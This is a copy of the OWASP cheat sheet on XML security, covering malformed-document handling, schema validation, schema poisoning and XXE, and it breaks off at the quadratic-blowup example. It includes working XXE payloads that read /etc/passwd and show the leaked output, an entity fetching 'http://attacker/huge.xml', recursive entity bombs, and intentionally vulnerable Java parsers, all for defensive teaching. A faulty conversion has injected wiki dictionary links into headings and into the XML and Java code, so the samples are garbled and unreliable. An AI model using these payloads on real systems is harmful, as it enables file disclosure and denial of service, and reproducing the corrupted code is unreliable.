---
title: "XML Security Cheat Sheet"
source: "[[_content/dictionary#O|OWASP]] Cheatsheet"
source_url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html"
created: "1741872882.2426019"
tags: [owasp, cheatsheet, security]
---
# [[_content/dictionary#X|XML]] Security

## [[_content/dictionary#X|XML]] Security Cheat Sheet[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[¶](#brute-forcing)](#port-scanning)](#file-retrieval-with-parameter-entities)](#external-connection)](#external-dns-resolution)](#server-side-request-forgery)](#reflected-file-retrieval)](#billion-laughs)](#quadratic-blowup)](#recursive-entity-reference)](#xxe-using-stax)](#xxe-using-sax)](#xxe-using-dom4j)](#xxe-using-dom)](#sample-vulnerable-java-implementations)](#xml-entity-expansion)](#evil-employee-attack)](#dns-cache-poisoning)](#man-in-the-middle-mitm-attack)](#remote-schema-poisoning)](#incorrect-permissions)](#embedded-schema)](#local-schema-poisoning)](#schema-poisoning)](#small-jumbo-payloads)](#traditional-jumbo-payloads)](#jumbo-payloads)](#occurrences)](#assertions)](#patterns)](#ranges)](#prefixed-values)](#general-data-restrictions)](#special-values-infinity-and-not-a-number-nan)](#divide-by-zero)](#negative-and-positive-restrictions)](#numeric-data-types)](#string-data-types)](#improper-data-validation)](#unrestrictive-schema)](#document-without-schema)](#dealing-with-invalid-xml-documents)](#violation-of-xml-specification-rules)](#handling-coercive-parsing)](#well-formed-document-to-well-formed-document-normalized)](#malformed-document-to-malformed-document)](#applications-processing-malformed-data)](#malformed-xml-documents-require-extra-time)](#handling-malformed-xml-documents)](#definition-of-a-malformed-xml-document)](#dealing-with-malformed-xml-documents)](#introduction)](#xml-security-cheat-sheet)
### Introduction¶
While the specifications for XML and XML schemas provide you with the tools needed to protect XML applications, they also include multiple security flaws. They can be exploited to perform multiple types of attacks, including file retrieval, server side request forgery, port scanning, and brute forcing. This cheat sheet will make you aware of how attackers can exploit the different possibilities in XML used in libraries and software using two possible attack surfaces:

- Malformed [[_content/dictionary#X|XML]] Documents: Exploiting vulnerabilities that occur when applications encounter XML documents that are not well-formed.
- Invalid [[_content/dictionary#X|XML]] Documents: Exploiting vulnerabilities that occur when documents that do not have the expected structure.

### Dealing with malformed [[_content/dictionary#X|XML]] documents¶
#### Definition of a malformed [[_content/dictionary#X|XML]] document¶
If an XML document does not follow the W3C XML specification's definition of a well-formed document, it is considered "malformed." If an XML document is malformed, the XML parser will detect a fatal error, it should stop execution, the document should not undergo any additional processing, and the application should display an error message. A malformed document can include one or more of the following problems: a missing ending tag, the order of elements into a nonsensical structure, introducing forbidden characters, and so on.
#### Handling malformed [[_content/dictionary#X|XML]] documents¶
To deal with malformed documents, developers should use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, they should only use well-formed documents, validate the contents of each element, and process only valid values within predefined boundaries.
##### Malformed [[_content/dictionary#X|XML]] documents require extra time¶
A malformed document may affect the consumption of Central Processing Unit ([[_content/dictionary#C|CPU]]) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service ([[_content/dictionary#D|DoS]]).
To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.
#### Applications Processing Malformed Data¶
Certain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results from these parsers may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.
The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:
##### Malformed Document to Malformed Document¶
According to the XML specification, the string -- (double-hyphen) must not occur within comments. Using the recovery mode of lxml and [[_content/dictionary#P|PHP]], the following document will remain the same after being recovered:
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>

##### Well-Formed Document to Well-Formed Document Normalized¶
Certain parsers may consider normalizing the contents of your [[_content/dictionary#C|CDATA]] sections. This means that they will update the special characters contained in the CDATA section to contain the safe versions of these characters even though is not required:
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>

Normalization of a [[_content/dictionary#C|CDATA]] section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>

#### Handling coercive parsing¶
One popular coercive attack in [[_content/dictionary#X|XML]] involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a [[_content/dictionary#D|DoS]] attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:
<A1>
 <A2>
  <A3>
   ...
    <A30000>

### Violation of [[_content/dictionary#X|XML]] Specification Rules¶
Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.
### Dealing with invalid [[_content/dictionary#X|XML]] documents¶
Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid, and a valid document is well formed and complies with the restrictions of a schema. More than one schema can be used to validate a document, and these restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.
The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not [[[[[[[[[[[[[[[[[[[_content/dictionary#D|DTD]]](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)](https://www.w3schools.com/xml/xml_dtd_intro.asp)) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.
#### Document without Schema¶
Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an id value related to an item and a certain price. The user may only introduce a certain id value using the web interface:
<buy>
 <id>123</id>
 <price>10</price>
</buy>

If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>

Notice again how the value 123 is supplied as an id, but now the document includes additional opening and closing tags. The attacker closed the id element and sets a bogus price element to the value 0. The final step to keep the structure well-formed is to add one empty id element. After this, the application adds the closing tag for id and set the price to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.
#### Unrestrictive Schema¶
Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using [[_content/dictionary#D|DTD]]; it has a very limited set of possibilities compared to the type of restrictions that can be applied in [[_content/dictionary#X|XML]] documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's age is validated against an inline DTD schema:
<![[_content/dictionary#D|DOCTYPE]] person [
 <![[_content/dictionary#E|ELEMENT]] person (name, age)>
 <!ELEMENT name (#[[_content/dictionary#P|PCDATA]])>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>

The previous document contains an inline [[_content/dictionary#D|DTD]] with a root element named person. This element contains two elements in a specific order: name and then age. The element name is then defined to contain [[_content/dictionary#P|PCDATA]] as well as the element age.
After this definition begins the well-formed and valid [[_content/dictionary#X|XML]] document. The element name contains an irrelevant value but the age element contains one million digits. Since there are no restrictions on the maximum size for the age element, this one-million-digit string could be sent to the server for this element.
Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents.
Since it is not possible to indicate specific restrictions (a maximum length for the element name or a valid range for the element age), this type of schema increases the risk of affecting the integrity and availability of resources.
#### Improper Data Validation¶
When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.
##### String Data Types¶
Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:
<element name="[[_content/dictionary#C|CipherData]]" type="xenc:[[_content/dictionary#C|CipherDataType]]"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="[[_content/dictionary#C|CipherValue]]" type="base64Binary"/>
   <element ref="xenc:[[_content/dictionary#C|CipherReference]]"/>
  </choice>
 </complexType>

The previous schema defines the element [[_content/dictionary#C|CipherValue]] as a base64 data type. As an example, the IBM [[_content/dictionary#W|WebSphere]] [[_content/dictionary#D|DataPower]] [[_content/dictionary#S|SOA]] Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.
The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the [[_content/dictionary#C|CipherData]] element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.
##### Numeric Data Types¶
Defining the correct data type for numbers can be more complex since there are more options than there are for strings.
###### Negative and Positive Restrictions¶
[[_content/dictionary#X|XML]] Schema numeric data types can include different ranges of numbers. They can include:

- negativeInteger: Only negative numbers
- nonNegativeInteger: Positive numbers and the zero value
- positiveInteger: Only positive numbers
- nonPositiveInteger: Negative numbers and the zero value

The following sample document defines an id for a product, a price, and a quantity value that is under the control of an attacker:
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>

To avoid repeating old errors, an [[_content/dictionary#X|XML]] schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>

Limiting that quantity to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing price*quantity. However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.
###### Divide by Zero¶
Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in [[_content/dictionary#X|XSLT]], the error FOAR0001 will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for [[_content/dictionary#X|XML]] schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type positiveInteger for the element.
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>

The element denominator is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.
###### Special Values: Infinity and Not a Number (NaN)¶
The data types float and double contain real numbers and some special values: -Infinity or -[[_content/dictionary#I|INF]], NaN, and +Infinity or INF. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies.
Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values Infinity and NaN are not required and only real numbers are expected, the data type decimal is recommended:
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>

The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.
##### General Data Restrictions¶
After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:
###### Prefixed Values¶
Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called enumeration in an [[_content/dictionary#X|XML]] schema. The following example restricts the contents of the element month to 12 possible values:
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.
###### Ranges¶
Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

###### Patterns¶
Certain elements or attributes may follow a specific syntax. You can add pattern restrictions when using [[_content/dictionary#X|XML]] schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers ([[_content/dictionary#S|SSN]]) may serve as a good example; they must use a specific set of characters, a specific length, and a specific pattern:
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

Only numbers between 000-00-0000 and 999-99-9999 will be allowed as values for a [[_content/dictionary#S|SSN]].
###### Assertions¶
Assertion components constrain the existence and values of related elements and attributes on [[_content/dictionary#X|XML]] schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable $value can be used to reference the contents of the value being analyzed.
The Divide by Zero section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an assertion disallowing the number zero:
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

The assertion guarantees that the denominator will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.
###### Occurrences¶
The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: minOccurs and maxOccurs.
The default value for both the minOccurs and the maxOccurs attributes is 1, but certain elements may require other values. For instance, if a value is optional, it could contain a minOccurs of 0, and if there is no limit on the maximum amount, it could contain a maxOccurs of unbounded, as in the following example:
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>

The previous schema includes a root element named operation, which can contain an unlimited (unbounded) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an unbounded value.
#### Jumbo Payloads¶
Sending an [[_content/dictionary#X|XML]] document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the [[_content/dictionary#C|CPU]] and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.
##### Traditional Jumbo Payloads¶
There are two primary methods to make a document larger than normal:
- Depth attack: using a huge number of elements, element names, and/or element values.
- Width attack: using a huge number of attributes, attribute names, and/or attribute values.
In most cases, the overall result will be a huge document. This is a short example of what this looks like:
<[[[_content/dictionary#S|SOAP]]](https://en.wikipedia.org/wiki/SOAP)[[_content/dictionary#E|ENV]]:[[_content/dictionary#E|ENVELOPE]] [[_content/dictionary#X|XMLNS]]:[[_content/dictionary#S|SOAPENV]]="[[_content/dictionary#H|HTTP]]://[[_content/dictionary#S|SCHEMAS]].[[_content/dictionary#X|XMLSOAP]].[[_content/dictionary#O|ORG]]/[[_content/dictionary#S|SOAP]]/[[_content/dictionary#E|ENVELOPE]]/"
                  XMLNS:[[_content/dictionary#E|EXT]]="HTTP://[[_content/dictionary#C|COM]]/IBM/[[_content/dictionary#W|WAS]]/[[_content/dictionary#W|WSSAMPLE]]/[[_content/dictionary#S|SEI]]/[[_content/dictionary#E|ECHO]]/B2B/[[_content/dictionary#E|EXTERNAL]]">
 <SOAPENV:[[_content/dictionary#H|HEADER]] LARGENAME1="[[_content/dictionary#L|LARGEVALUE]]"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...

##### "Small" Jumbo Payloads¶
The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:
<?xml version="1.0"?>
<![[_content/dictionary#D|DOCTYPE]] root [
 <![[_content/dictionary#E|ENTITY]] file [[_content/dictionary#S|SYSTEM]] "http://attacker/huge.xml" >
]>
<root>&file;</root>

#### Schema Poisoning¶
When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using [[_content/dictionary#D|DTD]] (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.
##### Local Schema Poisoning¶
Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same [[_content/dictionary#X|XML]] document.
###### Embedded Schema¶
The most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C :
<?xml version="1.0"?>
<![[_content/dictionary#D|DOCTYPE]] note [
 <![[_content/dictionary#E|ELEMENT]] note (to,from,heading,body)>
 <!ELEMENT to (#[[_content/dictionary#P|PCDATA]])>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>

All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded [[_content/dictionary#X|XML]] schemas can also assist in port scans of internal hosts or brute force attacks.
###### Incorrect Permissions¶
You can often circumvent the risk of using remotely tampered versions by processing a local schema.
<![[_content/dictionary#D|DOCTYPE]] note [[_content/dictionary#S|SYSTEM]] "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>

However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd

The permissions set on name.dtd allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an [[_content/dictionary#X|XML]] or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.
##### Remote Schema Poisoning¶
Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.
###### Man-in-the-Middle (MitM) Attack¶
When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol ([[_content/dictionary#H|HTTP]]), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:
<![[_content/dictionary#D|DOCTYPE]] note [[_content/dictionary#S|SYSTEM]] "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>

The remote file note.dtd could be susceptible to tampering when transmitted using the unencrypted [[_content/dictionary#H|HTTP]] protocol. One tool available to facilitate this type of attack is mitmproxy .
###### [[_content/dictionary#D|DNS]]-Cache Poisoning¶
Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure ([[_content/dictionary#H|HTTPS]]). When software performs reverse Domain Name System (DNS) resolution on an [[_content/dictionary#I|IP]] address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.
The previous example referenced the host example.com using an unencrypted protocol.
When switching to HTTPS, the location of the remote schema will look like https://example/note.dtd. In a normal scenario, the IP of example.com resolves to 1.1.1.1:
$ host example.com
example.com has address 1.1.1.1

If an attacker compromises the [[_content/dictionary#D|DNS]] being used, the previous hostname could now point to a new, different [[_content/dictionary#I|IP]] controlled by the attacker 2.2.2.2:
$ host example.com
example.com has address 2.2.2.2

When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.
###### Evil Employee Attack¶
When third parties host and define schemas, the contents are not under the control of the schemas' users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is [[_content/dictionary#D|DTD]]).
#### [[_content/dictionary#X|XML]] Entity Expansion¶
**If the parser uses a DTD, an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.
##### Sample Vulnerable Java Implementations¶
Using the DTD capabilities of referencing local or remote files it is possible to affect file confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an [[_content/dictionary#X|XXE]].
Sample XML:
<![[_content/dictionary#D|DOCTYPE]] contacts [[_content/dictionary#S|SYSTEM]] "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>

Sample [[_content/dictionary#D|DTD]]:
<![[_content/dictionary#E|ELEMENT]] contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#[[_content/dictionary#P|PCDATA]])>
<!ELEMENT lastname [[_content/dictionary#A|ANY]]>
<![[_content/dictionary#E|ENTITY]] xxe [[_content/dictionary#S|SYSTEM]] "/etc/passwd">

###### [[_content/dictionary#X|XXE]] using [[_content/dictionary#D|DOM]]¶
import java.io.IOException;
import javax.xml.parsers.[[_content/dictionary#D|DocumentBuilder]];
import javax.xml.parsers.[[_content/dictionary#D|DocumentBuilderFactory]];
import javax.xml.parsers.[[_content/dictionary#P|ParserConfigurationException]];
import org.xml.sax.[[_content/dictionary#I|InputSource]];
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.[[_content/dictionary#N|NodeList]];

public class parseDocument {
 public static void main(String[] args) {
  try {
   [[_content/dictionary#D|DocumentBuilderFactory]] factory = DocumentBuilderFactory.newInstance();
   [[_content/dictionary#D|DocumentBuilder]] builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new [[_content/dictionary#I|InputSource]]("contacts.xml"));
   [[_content/dictionary#N|NodeList]] nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}

The previous code produces the following output:
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh

###### [[_content/dictionary#X|XXE]] using DOM4J¶
import org.dom4j.Document;
import org.dom4j.[[_content/dictionary#D|DocumentException]];
import org.dom4j.io.SAXReader;
import org.dom4j.io.[[_content/dictionary#O|OutputFormat]];
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  [[_content/dictionary#O|OutputFormat]] format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

The previous code produces the following output:
$ java test1
<?xml version="1.0" encoding="[[_content/dictionary#U|UTF]]-8"?>
<![[_content/dictionary#D|DOCTYPE]] contacts [[_content/dictionary#S|SYSTEM]] "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh

###### [[_content/dictionary#X|XXE]] using [[_content/dictionary#S|SAX]]¶
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.[[_content/dictionary#D|DefaultHandler]];

public class parseDocument extends [[_content/dictionary#D|DefaultHandler]] {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}

The previous code produces the following output:
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh

###### [[_content/dictionary#X|XXE]] using StAX¶
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.[[_content/dictionary#F|FileReader]];
import java.io.[[_content/dictionary#F|FileInputStream]];

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   [[_content/dictionary#F|FileReader]] fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new [[_content/dictionary#F|FileInputStream]](file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

The previous code produces the following output:
$ java parseDocument
<![[_content/dictionary#D|DOCTYPE]] contacts [[_content/dictionary#S|SYSTEM]] "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh

##### Recursive Entity Reference¶
When the definition of an element A is another element B, and that element B is defined as element A, that schema describes a circular reference between elements:
<![[_content/dictionary#D|DOCTYPE]] A [
 <![[_content/dictionary#E|ELEMENT]] A [[_content/dictionary#A|ANY]]>
 <![[_content/dictionary#E|ENTITY]] A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>

##### Quadratic Blowup¶
Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (O(n^2)).
The result of the following attack will be 100,000 x 100,000 characters in memory.
<![[_content/dictionary#D|DOCTYPE]] root [
